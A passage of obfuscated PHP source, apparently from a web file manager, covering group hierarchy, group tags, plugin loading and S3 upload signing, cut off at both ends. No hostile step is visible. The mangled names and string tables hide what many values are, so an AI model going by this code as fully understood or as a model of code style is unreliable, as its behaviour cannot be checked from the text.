$„ßë›¹ = $this->parentLevelArray($¼ºİ„ï¿[$®¢×®Î¦[593]]); $¬œ§ÄãË = $®¢×®Î¦[12]; foreach ($„ßë›¹ as $“ŞüŠÈ¹ => $û¬®×÷Õ) { if ($ì×üíúÔ && $“ŞüŠÈ¹ == 0) { continue; } $¬œ§ÄãË .= $øœéĞıÂ[$û¬®×÷Õ] . $®¢×®Î¦[8]; } if ($„ßë›¹) { $¬œ§ÄãË .= $¼ºİ„ï¿[$®¢×®Î¦[32]]; } $¼ºİ„ï¿[$®¢×®Î¦[598]] = str_replace($®¢×®Î¦[601], $®¢×®Î¦[8], $¬œ§ÄãË); } unset($¼ºİ„ï¿); } private function _listAppendSourceRoot(&$…õÃôÑ¼, $õâ¹Ë³–) { $°ìßÒ¬• =& $_SERVER[£ğ°ÖØø]; $Ã—¢ÎêÜ = Model($°ìßÒ¬•[888])->listSourceRoot(SourceModel::TYPE_GROUP, $õâ¹Ë³–); $Ã—¢ÎêÜ = array_to_keyvalue($Ã—¢ÎêÜ, $°ìßÒ¬•[578]); $Ã—¢ÎêÜ = array_remove_key($Ã—¢ÎêÜ, $°ìßÒ¬•[578]); foreach ($…õÃôÑ¼ as &$èÒÄµ¸Ş) { $èÒÄµ¸Ş[$°ìßÒ¬•[90]] = $Ã—¢ÎêÜ[$èÒÄµ¸Ş[$°ìßÒ¬•[1954]]] ? $Ã—¢ÎêÜ[$èÒÄµ¸Ş[$°ìßÒ¬•[1954]]] : array(); } unset($èÒÄµ¸Ş); } protected function groupMerge($¨ô€¬Àş) { $¨ô€¬Àş = array_values(array_unique($¨ô€¬Àş)); $’Ñ«Ç°· = array(); for ($‚ğªÆÉÄ = 0; $‚ğªÆÉÄ < count($¨ô€¬Àş); $‚ğªÆÉÄ++) { $©ïşÄì¥ = !1; for ($ıÕõÚ›ı = 0; $ıÕõÚ›ı < count($¨ô€¬Àş); $ıÕõÚ›ı++) { if ($‚ğªÆÉÄ == $ıÕõÚ›ı) { continue; } if ($this->isParentOf($¨ô€¬Àş[$ıÕõÚ›ı], $¨ô€¬Àş[$‚ğªÆÉÄ])) { $©ïşÄì¥ = !0; break; } } if (!$©ïşÄì¥) { $’Ñ«Ç°·[] = $¨ô€¬Àş[$‚ğªÆÉÄ]; } } return $’Ñ«Ç°·; } protected function isParentOf($Ì•¹‚Ÿí, $€ØÛˆ¹ü) { $ÆòÕ¥ğË =& $_SERVER[£ğ°ÖØø]; if (!$Ì•¹‚Ÿí || !$€ØÛˆ¹ü || $Ì•¹‚Ÿí == $€ØÛˆ¹ü) { return !1; } $î²Íƒğ = $this->getInfoSimple($Ì•¹‚Ÿí); $³Û£àµ± = $this->getInfoSimple($€ØÛˆ¹ü); $Œˆ›¸¡‡ = $î²Íƒğ[$ÆòÕ¥ğË[593]] . $Ì•¹‚Ÿí . $ÆòÕ¥ğË[50]; if (substr($³Û£àµ±[$ÆòÕ¥ğË[593]], 0, strlen($Œˆ›¸¡‡)) == $Œˆ›¸¡‡) { return !0; } return !1; } public function groupShowRoot($ÎšÛû‘ì, $¿¿Ã¸¥ = false) { $ÊÊ¸“½— =& $_SERVER[£ğ°ÖØø]; $ˆ¥Ü¾±Ÿ = $this->getInfo($ÎšÛû‘ì); if (!$ˆ¥Ü¾±Ÿ) { return array(); } $ öÇ¡Ï• = $this->parentLevelArray($ˆ¥Ü¾±Ÿ[$ÊÊ¸“½—[593]]); $ÀûÂòîï = array($ÎšÛû‘ì); if (count($ öÇ¡Ï•) == 0) { return $ÀûÂòîï; } if ($¿¿Ã¸¥ && count($ öÇ¡Ï•) == 1) { return $ÀûÂòîï; } if (!$ˆ¥Ü¾±Ÿ[$ÊÊ¸“½—[548]] || !isset($ˆ¥Ü¾±Ÿ[$ÊÊ¸“½—[548]][$ÊÊ¸“½—[2044]]) || $ˆ¥Ü¾±Ÿ[$ÊÊ¸“½—[548]][$ÊÊ¸“½—[2044]] == $ÊÊ¸“½—[840]) { return $this->groupShowRoot($ öÇ¡Ï•[count($ öÇ¡Ï•) - 1], $¿¿Ã¸¥); } if ($ˆ¥Ü¾±Ÿ[$ÊÊ¸“½—[548]][$ÊÊ¸“½—[2044]] == $ÊÊ¸“½—[442]) { $€åŸ§èô = explode($ÊÊ¸“½—[50], $ˆ¥Ü¾±Ÿ[$ÊÊ¸“½—[548]][$ÊÊ¸“½—[2045]]); if ($€åŸ§èô) { $ÀûÂòîï = array_merge($ÀûÂòîï, $€åŸ§èô); } } return $ÀûÂòîï; } protected function resetParentLevel() { $ë×ë¨ =& $_SERVER[£ğ°ÖØø]; $Õ¡ê×şÃ = $ë×ë¨[1954]; $ÏïÖğ½Ş = $this->select(); $ÏïÖğ½Ş = array_to_keyvalue($ÏïÖğ½Ş, $Õ¡ê×şÃ); foreach ($ÏïÖğ½Ş as $áŒüà¯) { $âÖœÜÌİ = $áŒüà¯; $ûı™üØ• = array(); while ($âÖœÜÌİ[$ë×ë¨[192]] != 0) { $ûı™üØ•[] = $âÖœÜÌİ[$ë×ë¨[192]]; $âÖœÜÌİ = $ÏïÖğ½Ş[$âÖœÜÌİ[$ë×ë¨[192]]]; } $ûı™üØ•[] = 0; $ûı™üØ• = $ë×ë¨[50] . implode($ë×ë¨[50], array_reverse($ûı™üØ•)) . $ë×ë¨[50]; $this->setNamePinyin($áŒüà¯[$Õ¡ê×şÃ], $áŒüà¯[$ë×ë¨[32]]); $this->where(array($Õ¡ê×şÃ => $áŒüà¯[$Õ¡ê×şÃ]))->save(array($ë×ë¨[661] => $ûı™üØ•)); } return $ÏïÖğ½Ş; } public function groupNameAuto($¡òÁë¹Û, $â¤ÃŞ¸‰) { $Û±„¨ØÇ =& $_SERVER[£ğ°ÖØø]; $²¤šĞƒ± = $this->where(array($Û±„¨ØÇ[486] => $¡òÁë¹Û))->getField($Û±„¨ØÇ[32], !0); if (!$²¤šĞƒ± || !in_array($â¤ÃŞ¸‰, $²¤šĞƒ±)) { return $â¤ÃŞ¸‰; } for ($Ò·½‰àÅ = 1; $Ò·½‰àÅ <= count($²¤šĞƒ±) + 1; $Ò·½‰àÅ++) { $ÉÊ¹“Ü = $â¤ÃŞ¸‰ . "\50{$Ò·½‰àÅ}\51"; if (!in_array($ÉÊ¹“Ü, $²¤šĞƒ±)) { return $ÉÊ¹“Ü; } } } public function groupSwitch($Ïõ¤ò¶, $§™äŠƒ) { $×ï’Îõ =& $_SERVER[£ğ°ÖØø]; $•şÜ°Ø = array($×ï’Îõ[1954] => array($×ï’Îõ[7], array($Ïõ¤ò¶, $§™äŠƒ))); $Ÿ­î›“í = $this->where($•şÜ°Ø)->select(); $Ÿ­î›“í = array_to_keyvalue($Ÿ­î›“í, $×ï’Îõ[1954]); if (!isset($Ÿ­î›“í[$Ïõ¤ò¶]) || !isset($Ÿ­î›“í[$§™äŠƒ]) || $Ÿ­î›“í[$Ïõ¤ò¶][$×ï’Îõ[192]] == 0) { return !1; } $•şÜ°Ø = array($×ï’Îõ[1954] => $Ïõ¤ò¶); $ñ† ò = Model($×ï’Îõ[2048])->where($•şÜ°Ø)->select(); if (!$ñ† ò) { $ñ† ò = array(); } foreach ($ñ† ò as $Ş†ºè”ü) { $ÎÏıÅÊş = $Ş†ºè”ü[$×ï’Îõ[1755]]; $•şÜ°Ø = array($×ï’Îõ[1755] => $ÎÏıÅÊş, $×ï’Îõ[1954] => $§™äŠƒ); $¾ÛìÖƒÀ = Model($×ï’Îõ[2048])->where($•şÜ°Ø)->find(); if (!$¾ÛìÖƒÀ) { $í¼ı ½Í = array($§™äŠƒ => $Ş†ºè”ü[$×ï’Îõ[2062]]); Model($×ï’Îõ[607])->userGroupAdd($ÎÏıÅÊş, $í¼ı ½Í); } Model($×ï’Îõ[607])->userGroupRemove($ÎÏıÅÊş, $Ïõ¤ò¶); } $•şÜ°Ø = array($×ï’Îõ[190] => 2, $×ï’Îõ[192] => 0, $×ï’Îõ[494] => 1, $×ï’Îõ[578] => array($×ï’Îõ[7], array($Ïõ¤ò¶, $§™äŠƒ))); $è‡˜ïÕ• = Model($×ï’Îõ[888])->where($•şÜ°Ø)->field($×ï’Îõ[2063])->select(); $è‡˜ïÕ• = array_to_keyvalue($è‡˜ïÕ•, $×ï’Îõ[578], $×ï’Îõ[193]); $É¯†ôïù = !empty($è‡˜ïÕ•[$Ïõ¤ò¶]) ? $è‡˜ïÕ•[$Ïõ¤ò¶] : !1; if ($É¯†ôïù) { if (!$è‡˜ïÕ•[$§™äŠƒ]) { $è‡˜ïÕ•[$§™äŠƒ] = Model($×ï’Îõ[888])->groupRootAdd($§™äŠƒ); } $ìƒ¹Ş˜Ş = $è‡˜ïÕ•[$§™äŠƒ]; $•şÜ°Ø = array($×ï’Îõ[192] => $É¯†ôïù); $è‡˜ïÕ• = Model($×ï’Îõ[888])->where($•şÜ°Ø)->field($×ï’Îõ[2064])->select(); if (!$è‡˜ïÕ•) { $è‡˜ïÕ• = array(); } Model($×ï’Îõ[888])->moveClearAuth = !1; foreach ($è‡˜ïÕ• as $öºŒ“Ã) { $“©ò „ø = $öºŒ“Ã[$×ï’Îõ[494]] == $×ï’Îõ[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($×ï’Îõ[888])->move($öºŒ“Ã[$×ï’Îõ[193]], $ìƒ¹Ş˜Ş, $“©ò „ø); } Model($×ï’Îõ[888])->moveClearAuth = !0; $•şÜ°Ø = array($×ï’Îõ[190] => 2, $×ï’Îõ[578] => $Ïõ¤ò¶); $°ñªëõš = array($×ï’Îõ[578] => $§™äŠƒ); Model($×ï’Îõ[2065])->where($•şÜ°Ø)->save($°ñªëõš); Model($×ï’Îõ[2066])->where($•şÜ°Ø)->save($°ñªëõš); } $this->_changeChildLevel($Ÿ­î›“í[$Ïõ¤ò¶], $Ÿ­î›“í[$§™äŠƒ], !0); $this->where(array($×ï’Îõ[192] => $Ïõ¤ò¶))->save(array($×ï’Îõ[192] => $§™äŠƒ)); $this->_clearChildrenCache($Ÿ­î›“í[$§™äŠƒ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\x65\162\x5f\146\141\166"; protected function cacheFunctionAlias($Õéç´´¹) { $‘Å‘ñ·Ò =& $_SERVER[£ğ°ÖØø]; return array($‘Å‘ñ·Ò[2067] => array($Õéç´´¹[0], $‘Å‘ñ·Ò[2068]), $‘Å‘ñ·Ò[2069] => array($Õéç´´¹[0], $‘Å‘ñ·Ò[2070])); } protected function get($ü—Éáí) { $“È‚Œ =& $_SERVER[£ğ°ÖØø]; $Š”•üô— = Model($“È‚Œ[594])->metaGet($ü—Éáí, $“È‚Œ[2071]); $éĞÍŞ˜Ã = json_decode($Š”•üô—, !0); return $éĞÍŞ˜Ã ? $éĞÍŞ˜Ã : array($“È‚Œ[2072] => $“È‚Œ[91], $“È‚Œ[454] => array()); } protected function set($­Ş¿¯¾®, $Ç‚‡ËŸÄ) { $È¤û¾æ˜ =& $_SERVER[£ğ°ÖØø]; $Ç‚‡ËŸÄ = $Ç‚‡ËŸÄ ? $Ç‚‡ËŸÄ : array($È¤û¾æ˜[2072] => $È¤û¾æ˜[91], $È¤û¾æ˜[454] => array()); return Model($È¤û¾æ˜[594])->metaSet($­Ş¿¯¾®, $È¤û¾æ˜[2071], json_encode($Ç‚‡ËŸÄ)); } protected function getByTagID($Ø¤Áõêë, $¸ÙùáÒ¡) { $“‘ÜşÄ =& $_SERVER[£ğ°ÖØø]; if (!$Ø¤Áõêë || !$¸ÙùáÒ¡) { return !1; } if (!Model($“‘ÜşÄ[594])->getInfoSimple($Ø¤Áõêë)) { return !1; } $¬¹¶›Ê = $this->get($Ø¤Áõêë); if (!$¬¹¶›Ê || !isset($¬¹¶›Ê[$“‘ÜşÄ[454]])) { return !1; } $ò¶øÉìş = array_find_by_field($¬¹¶›Ê[$“‘ÜşÄ[454]], $“‘ÜşÄ[484], $¸ÙùáÒ¡); return is_array($ò¶øÉìş) ? $ò¶øÉìş : !1; } public function listSource($Ì«éçÊö, $œ®¾éàÑ) { $÷­’‡Ÿ =& $_SERVER[£ğ°ÖØø]; if ($œ®¾éàÑ && !is_array($œ®¾éàÑ)) { $œ®¾éàÑ = array($œ®¾éàÑ); } $ô†Áˆû’ = $this->listData($Ì«éçÊö); $Ò õ¸£Ÿ = array(); foreach ($ô†Áˆû’ as $ÃßªĞ¸ä) { $™ëŠŠÜ  = $ÃßªĞ¸ä[$÷­’‡Ÿ[87]]; if (!$™ëŠŠÜ ) { continue; } if (!isset($Ò õ¸£Ÿ[$™ëŠŠÜ ])) { $Ò õ¸£Ÿ[$™ëŠŠÜ ] = array(); } $Ò õ¸£Ÿ[$™ëŠŠÜ ][] = $ÃßªĞ¸ä[$÷­’‡Ÿ[509]]; } $„©´Ûæ€ = array(); foreach ($Ò õ¸£Ÿ as $™›Õ÷¡´ => $àé»İì) { $»’ÏóÎù = !0; if (!$œ®¾éàÑ) { $„©´Ûæ€[] = $™›Õ÷¡´; continue; } foreach ($œ®¾éàÑ as $àÏ®àü’) { if (!in_array($àÏ®àü’, $àé»İì)) { $»’ÏóÎù = !1; break; } } if ($»’ÏóÎù) { $„©´Ûæ€[] = $™›Õ÷¡´; } } if (!$„©´Ûæ€) { return array(); } $òÜœÌÜê = array($÷­’‡Ÿ[500] => array($÷­’‡Ÿ[501], $„©´Ûæ€), $÷­’‡Ÿ[578] => $Ì«éçÊö, $÷­’‡Ÿ[190] => SourceModel::TYPE_GROUP); $ö÷ê—á× = Model($÷­’‡Ÿ[1401])->listSource($òÜœÌÜê); if (!$ö÷ê—á× || count($„©´Ûæ€) == $ö÷ê—á×[$÷­’‡Ÿ[451]][$÷­’‡Ÿ[452]]) { return $ö÷ê—á×; } $¿›×æ = array(); $ÒÇ™È´ = array_to_keyvalue($ö÷ê—á×[$÷­’‡Ÿ[85]], $÷­’‡Ÿ[12], $÷­’‡Ÿ[193]); $£üãòˆ¤ = array_to_keyvalue($ö÷ê—á×[$÷­’‡Ÿ[86]], $÷­’‡Ÿ[12], $÷­’‡Ÿ[193]); $³Õå†½ü = array_merge($£üãòˆ¤, $ÒÇ™È´); foreach ($„©´Ûæ€ as $™ëŠŠÜ ) { if (!in_array($™ëŠŠÜ , $³Õå†½ü)) { $¿›×æ[] = $™ëŠŠÜ ; } } if ($¿›×æ) { $this->removeBySource($Ì«éçÊö, $¿›×æ); } return $ö÷ê—á×; } protected function listData($ÃÂ›Şöô) { $ŞÃŞıâ„ =& $_SERVER[£ğ°ÖØø]; $œà¾«ä = array($ŞÃŞıâ„[1746] => 0, $ŞÃŞıâ„[566] => array($ŞÃŞıâ„[2073], 0), $ŞÃŞıâ„[505] => $ŞÃŞıâ„[2074] . $ÃÂ›Şöô); $úø×‡Ü = $ŞÃŞıâ„[2075]; $ø£íĞ‚ü = $this->field($úø×‡Ü)->where($œà¾«ä)->order($ŞÃŞıâ„[2076])->select(); return $ø£íĞ‚ü ? $ø£íĞ‚ü : array(); } protected function addToTag($›«††“Ç, $¥ã¶Îš—, $Â€Ì’ñ) { $úˆÕ¿¢¡ =& $_SERVER[£ğ°ÖØø]; if (!$this->getByTagID($›«††“Ç, $Â€Ì’ñ) || !$¥ã¶Îš—) { return !1; } if (!Model($úˆÕ¿¢¡[888])->pathInfo($¥ã¶Îš—)) { return !1; } $«³”¨Õå = array($úˆÕ¿¢¡[1746] => 0, $úˆÕ¿¢¡[566] => $Â€Ì’ñ, $úˆÕ¿¢¡[504] => $¥ã¶Îš—, $úˆÕ¿¢¡[505] => $úˆÕ¿¢¡[2077] . $›«††“Ç, $úˆÕ¿¢¡[503] => $úˆÕ¿¢¡[12], $úˆÕ¿¢¡[1958] => 0); if ($this->where($«³”¨Õå)->find()) { return !1; } return $this->add($«³”¨Õå); } protected function removeFromTag($ãï°½Õ, $ŞéÊ½, $ëØŸÌ©™) { $³…æ–¼ =& $_SERVER[£ğ°ÖØø]; if (!$this->getByTagID($ãï°½Õ, $ëØŸÌ©™) || !$ŞéÊ½) { return !1; } if (is_array($ŞéÊ½)) { $ŞéÊ½ = array($³…æ–¼[7], $ŞéÊ½); } $‰¶ªÄşĞ = array($³…æ–¼[1746] => 0, $³…æ–¼[566] => $ëØŸÌ©™, $³…æ–¼[505] => $³…æ–¼[2077] . $ãï°½Õ, $³…æ–¼[504] => $ŞéÊ½); return $this->where($‰¶ªÄşĞ)->delete(); } protected function removeByTag($œèåÄ¨, $¤¯ÉÀïÆ) { $Ó€¯İ¸ =& $_SERVER[£ğ°ÖØø]; if (!$this->getByTagID($œèåÄ¨, $¤¯ÉÀïÆ)) { return !1; } $ÄŠ™Œ„Ï = array($Ó€¯İ¸[1746] => 0, $Ó€¯İ¸[566] => $¤¯ÉÀïÆ, $Ó€¯İ¸[505] => $Ó€¯İ¸[2077] . $œèåÄ¨); return $this->where($ÄŠ™Œ„Ï)->delete(); } protected function removeBySource($ ‚ˆ¦“Ï, $İØ¡€ô) { $‹’ş• =& $_SERVER[£ğ°ÖØø]; if (!$ ‚ˆ¦“Ï || !$İØ¡€ô) { return !1; } if (is_array($İØ¡€ô)) { $İØ¡€ô = array($‹’ş•[7], $İØ¡€ô); } $¦¶³ôæ— = array($‹’ş•[1746] => 0, $‹’ş•[504] => $İØ¡€ô, $‹’ş•[566] => array($‹’ş•[1075], 0), $‹’ş•[505] => $‹’ş•[2077] . $ ‚ˆ¦“Ï); return $this->where($¦¶³ôæ—)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\56\160\x6c\x75\147\151\x6e\x4c\151\x73\x74"; public $field = array("\156\x61\x6d\145", "\x73\164\141\x74\x75\x73", "\x72\145\147\151\145\163\x74", "\143\157\156\x66\x69\x67"); public function loadList($®µßÇÖ† = false) { $¡š£³¦ğ = array_to_keyvalue($this->listData(), $_SERVER[£ğ°ÖØø][32]); if ($®µßÇÖ†) { return $¡š£³¦ğ[$®µßÇÖ†]; } return $¡š£³¦ğ; } public function init() { $ã±š½ÃÔ =& $_SERVER[£ğ°ÖØø]; Hook::trigger($ã±š½ÃÔ[2078]); $üÉ¸Èæ“ = $this->loadPluginList(); foreach ($üÉ¸Èæ“ as $’´¢ú‹¸ => $„ˆó…ßá) { $Ô÷ïÌ½ø = $this->appAllow($’´¢ú‹¸, $„ˆó…ßá); if (!$Ô÷ïÌ½ø) { continue; } foreach ($„ˆó…ßá[$ã±š½ÃÔ[2079]] as $Àé…Õ¬ => $ŠğÔô’Ù) { Hook::bind($Àé…Õ¬, $ŠğÔô’Ù); } } Hook::trigger($ã±š½ÃÔ[2080]); Hook::trigger(ACTION); } public function appAllow($ÎéŞ’ÌÒ, $¢Â·÷•ü, $Øş¦¸ÉŒ = true) { $ß¿Ú¤§Á =& $_SERVER[£ğ°ÖØø]; $¨ñåÆ›Û = PLUGIN_DIR . $ÎéŞ’ÌÒ . $ß¿Ú¤§Á[2081]; if (!is_array($¢Â·÷•ü) || !is_array($¢Â·÷•ü[$ß¿Ú¤§Á[2079]]) || $¢Â·÷•ü[$ß¿Ú¤§Á[814]] != 1 || !is_file($¨ñåÆ›Û)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$ß¿Ú¤§Á[6]][$ß¿Ú¤§Á[2082]] || !$GLOBALS[$ß¿Ú¤§Á[6]][$ß¿Ú¤§Á[2083]]) { return !0; } $çª¦ïÔ = explode($ß¿Ú¤§Á[50], strtolower($GLOBALS[$ß¿Ú¤§Á[6]][$ß¿Ú¤§Á[2083]])); return in_array(strtolower($ÎéŞ’ÌÒ), $çª¦ïÔ) ? !1 : !0; } if ($Øş¦¸ÉŒ && !Action($ß¿Ú¤§Á[2084])->checkAuth($ÎéŞ’ÌÒ)) { return !1; } return !0; } public function unInstall($©‡Üù£) { $ü·÷Ûî =& $_SERVER[£ğ°ÖØø]; $’ÕÜ¾ò = $this->loadList($©‡Üù£); if (file_exists(PLUGIN_DIR . $©‡Üù£)) { Hook::apply($©‡Üù£ . $ü·÷Ûî[2085]); } $this->remove($’ÕÜ¾ò[$ü·÷Ûî[484]]); } public function changeStatus($“¤çÎ½è, $¥Ş¢šÒ‰) { $§¾óšúæ =& $_SERVER[£ğ°ÖØø]; $™Š´öø = $this->loadList($“¤çÎ½è); if ($¥Ş¢šÒ‰) { Hook::apply($“¤çÎ½è . $§¾óšúæ[2086]); } $this->update($™Š´öø[$§¾óšúæ[484]], array($§¾óšúæ[2087] => $¥Ş¢šÒ‰)); } public function appRegist($ÊÌÓ©¥Æ, $÷»Å­ú½) { $âî·Ã¦– =& $_SERVER[£ğ°ÖØø]; $³–êÔ÷Ì = $this->loadList($ÊÌÓ©¥Æ); if ($³–êÔ÷Ì) { $this->update($³–êÔ÷Ì[$âî·Ã¦–[484]], array($âî·Ã¦–[2079] => $÷»Å­ú½)); } else { $º¤Ò©Şş = array($âî·Ã¦–[32] => $ÊÌÓ©¥Æ, $âî·Ã¦–[2079] => $÷»Å­ú½, $âî·Ã¦–[814] => 0, $âî·Ã¦–[6] => $this->getConfigDefault($ÊÌÓ©¥Æ)); $this->insert($º¤Ò©Şş); } } public function getConfigDefault($·€ØáŠÍ) { $± ØşŞ  =& $_SERVER[£ğ°ÖØø]; $ÊƒèöÂ = array(); $öÀ•–¢Â = $this->getPackageJson($·€ØáŠÍ); if (!$öÀ•–¢Â && is_array($öÀ•–¢Â[$± ØşŞ [2088]])) { return $ÊƒèöÂ; } foreach ($öÀ•–¢Â[$± ØşŞ [2088]] as $İ¿…Î => $àöè¡îš) { if (!isset($àöè¡îš[$± ØşŞ [459]]) || isset($ÊƒèöÂ[$İ¿…Î])) { continue; } $ÊƒèöÂ[$İ¿…Î] = $àöè¡îš[$± ØşŞ [459]]; } return $ÊƒèöÂ; } public function getPackageJson($´ğàı¶Â) { return Hook::apply($´ğàı¶Â . $_SERVER[£ğ°ÖØø][2089]); } public function getConfig($œçâˆ¨¡, $Ç€üˆÕ– = false) { $Û©Üö¬ =& $_SERVER[£ğ°ÖØø]; $õ‹‚ÄÍ = array(); $¬öûÛü = $this->loadList($œçâˆ¨¡); if ($¬öûÛü && is_array($¬öûÛü[$Û©Üö¬[6]])) { $õ‹‚ÄÍ = $¬öûÛü[$Û©Üö¬[6]]; } if (!$õ‹‚ÄÍ || $Ç€üˆÕ–) { $õ‹‚ÄÍ = $this->getConfigDefault($œçâˆ¨¡); } return $õ‹‚ÄÍ; } public function setConfig($ıÇÌÉéº, $§û©Ä¡ = false) { $öŠº³· =& $_SERVER[£ğ°ÖØø]; $’£Ã„‹„ = $this->loadList($ıÇÌÉéº); if (!$’£Ã„‹„) { return !1; } $Æş¢£Ú = $’£Ã„‹„[$öŠº³·[6]]; if ($§û©Ä¡ == !1) { $Æş¢£Ú = array(); $§û©Ä¡ = $this->getConfigDefault($ıÇÌÉéº); } foreach ($§û©Ä¡ as $È¯µı±… => $­ğŸüÉ‡) { $Æş¢£Ú[$È¯µı±…] = is_string($­ğŸüÉ‡) ? trim($­ğŸüÉ‡) : $­ğŸüÉ‡; } $this->update($’£Ã„‹„[$öŠº³·[484]], array($öŠº³·[6] => $Æş¢£Ú)); } public function viewList() { $ÄîåŞÍ² =& $_SERVER[£ğ°ÖØø]; $ö˜ù©Ü¥ = $this->loadList(); $this->pluginScan($ö˜ù©Ü¥); $ö˜ù©Ü¥ = $this->loadPluginList(); $‹Šñï°— = array(); foreach ($ö˜ù©Ü¥ as $ÜœÙùÀ­ => $îË“İØ¸) { $™ğïÛš¿ = $îË“İØ¸; unset($îË“İØ¸[$ÄîåŞÍ²[2079]], $îË“İØ¸[$ÄîåŞÍ²[6]]); $°¡ıİÇÖ = PLUGIN_DIR . $îË“İØ¸[$ÄîåŞÍ²[32]] . $ÄîåŞÍ²[2081]; if (!is_file($°¡ıİÇÖ)) { continue; } $˜±ŸØÛ = Hook::apply($îË“İØ¸[$ÄîåŞÍ²[32]] . $ÄîåŞÍ²[2089]); if (!is_array($˜±ŸØÛ)) { continue; } $‹Šñï°—[$ÜœÙùÀ­] = array_merge($îË“İØ¸, $˜±ŸØÛ); if ($™ğïÛš¿[$ÄîåŞÍ²[6]][$ÄîåŞÍ²[1667]] != $˜±ŸØÛ[$ÄîåŞÍ²[1641]]) { Hook::apply($îË“İØ¸[$ÄîåŞÍ²[32]] . $ÄîåŞÍ²[2086]); $™ğïÛš¿[$ÄîåŞÍ²[6]][$ÄîåŞÍ²[1667]] = $˜±ŸØÛ[$ÄîåŞÍ²[1641]]; $this->update($îË“İØ¸[$ÄîåŞÍ²[484]], array($ÄîåŞÍ²[6] => $™ğïÛš¿[$ÄîåŞÍ²[6]])); } } return $‹Šñï°—; } private function loadPluginList() { $Ì£å£‰ø =& $_SERVER[£ğ°ÖØø]; $Ê„õ§ÑÕ = $this->loadList(); if (strtolower(MOD) == $Ì£å£‰ø[2090]) { return $Ê„õ§ÑÕ; } $ôõ«‰Ç‹ = Hook::trigger($Ì£å£‰ø[2091], $Ê„õ§ÑÕ); if ($Ê„õ§ÑÕ && !$ôõ«‰Ç‹) { die; } return $ôõ«‰Ç‹ ? $ôõ«‰Ç‹ : $Ê„õ§ÑÕ; } private function pluginScan($•Ø™ç¾ı) { $Ëëè¼Âı =& $_SERVER[£ğ°ÖØø]; recursion_dir(PLUGIN_DIR, $è”³æã‘, $Ã±îºñº, 0); foreach ($è”³æã‘ as $Â¬ù¿¬) { $æ„¿Èãè = get_path_this($Â¬ù¿¬); if (isset($•Ø™ç¾ı[$æ„¿Èãè]) || !file_exists($Â¬ù¿¬ . $Ëëè¼Âı[2092]) || !file_exists($Â¬ù¿¬ . $Ëëè¼Âı[2081])) { continue; } Hook::apply($æ„¿Èãè . $Ëëè¼Âı[2086]); } } } goto d·’•İï¦Â; fÌàÙõÉ‹: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ÃšÙ×) { $this->pathParse = $ÃšÙ×; } protected function infoParse($­®¿¥À÷, $›‚«ü°Ú = false) { $‡ˆšÍÂ =& $_SERVER[£ğ°ÖØø]; return Action($‡ˆšÍÂ[1239])->sharePathInfo($this->pathParse[$‡ˆšÍÂ[87]], !0, $›‚«ü°Ú); } public function listPath($”·™ú½, $¼®½İÜÉ = false) { $»¦Ççñ =& $_SERVER[£ğ°ÖØø]; $÷ˆÇ” = IO::listPath($”·™ú½, $¼®½İÜÉ); if (!$÷ˆÇ”) { return $÷ˆÇ”; } if (is_array($÷ˆÇ”[$»¦Ççñ[1409]])) { $Š»»¡¤ = Action($»¦Ççñ[1418])->parsePathChildren($÷ˆÇ”[$»¦Ççñ[1409]], array($»¦Ççñ[504] => $”·™ú½)); $÷ˆÇ”[$»¦Ççñ[1409]] = Action($»¦Ççñ[1239])->shareItemInfo($Š»»¡¤); } foreach ($÷ˆÇ” as $ÂŠáŞ•£ => $Ô”Á¢±“) { if (!in_array($ÂŠáŞ•£, array($»¦Ççñ[86], $»¦Ççñ[85]))) { continue; } foreach ($Ô”Á¢±“ as $¤æÆöÈ => $Š»»¡¤) { $Š»»¡¤ = Action($»¦Ççñ[1418])->parsePathChildren($Š»»¡¤, array($»¦Ççñ[504] => $”·™ú½)); $÷ˆÇ”[$ÂŠáŞ•£][$¤æÆöÈ] = Action($»¦Ççñ[1239])->shareItemInfo($Š»»¡¤); } } return $÷ˆÇ”; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($½‘‚¨¢È) { parent::__construct($½‘‚¨¢È); $this->setSignVersion($_SERVER[£ğ°ÖØø][247]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Æ„¾ıäÑ) { parent::__construct($Æ„¾ıäÑ); $this->setSignVersion($_SERVER[£ğ°ÖØø][247]); } public function uploadFormData($Ã­œÂéå, $Â¾û”“İ = 3600) { $§±îÀŸÍ =& $_SERVER[£ğ°ÖØø]; $Ì×‰ÄÇæ = $§±îÀŸÍ[229]; $œâøÅ»Ë = $§±îÀŸÍ[270]; $Î¾ê–°¤ = $§±îÀŸÍ[62]; $ŠøñÓşœ = gmdate($§±îÀŸÍ[271]); $ŸôÎÊÃ = gmdate($§±îÀŸÍ[272]); $°»Ü’™Ô = $§±îÀŸÍ[273]; $Æä˜Ö©… = $Â¾û”“İ . $§±îÀŸÍ[12]; $Á¥¡ÇàÀ = $§±îÀŸÍ[274]; $ª´Ø¹ = array($this->accessKey, $ŸôÎÊÃ, $this->region, $Î¾ê–°¤, $°»Ü’™Ô); $ø«î©÷ = implode($§±îÀŸÍ[8], $ª´Ø¹); $ÀÁÏáÉ = array($§±îÀŸÍ[275] => gmdate($§±îÀŸÍ[299], strtotime($§±îÀŸÍ[277])), $§±îÀŸÍ[278] => array(array($§±îÀŸÍ[279] => $this->bucket), array($§±îÀŸÍ[280] => $Ì×‰ÄÇæ), array($§±îÀŸÍ[281], $§±îÀŸÍ[282], $§±îÀŸÍ[12]), array($§±îÀŸÍ[281], $§±îÀŸÍ[283], $§±îÀŸÍ[12]), array($§±îÀŸÍ[281], $§±îÀŸÍ[284], $§±îÀŸÍ[12]), array($§±îÀŸÍ[285] => $Á¥¡ÇàÀ), array($§±îÀŸÍ[286] => $ø«î©÷), array($§±îÀŸÍ[287] => $œâøÅ»Ë), array($§±îÀŸÍ[288] => $ŠøñÓşœ), array($§±îÀŸÍ[289] => $Æä˜Ö©…))); $¨Õ˜ßè© = base64_encode(json_encode($ÀÁÏáÉ)); $ÛÍ©æŞ§ = hash_hmac($§±îÀŸÍ[290], $ŸôÎÊÃ, $§±îÀŸÍ[291] . $this->secret, !0); $Û³œ«Ê‘ = hash_hmac($§±îÀŸÍ[290], $this->region, $ÛÍ©æŞ§, !0); $³ÓıÑ« = hash_hmac($§±îÀŸÍ[290], $Î¾ê–°¤, $Û³œ«Ê‘, !0); $Ó„íò‰º = 